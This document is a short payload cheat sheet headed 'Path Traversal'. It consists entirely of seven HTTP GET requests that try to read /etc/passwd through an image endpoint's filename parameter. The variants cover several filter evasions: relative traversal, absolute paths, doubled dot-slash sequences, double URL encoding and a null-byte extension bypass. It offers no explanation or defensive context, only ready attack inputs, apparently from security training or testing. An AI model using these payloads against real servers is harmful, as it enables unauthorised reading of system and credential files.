# Path Traversal

GET /image?filename=../../../etc/passwd 
GET /image?filename=../../../../etc/passwd
GET /image?filename=/etc/passwd
GET /image?filename=....//....//....//....//etc/passwd
GET /image?filename=..%252f..%252f..%252fetc/passwd
GET /image?filename=/var/www/images/../../../etc/passwd
GET /image?filename=../../../etc/passwd%00.png
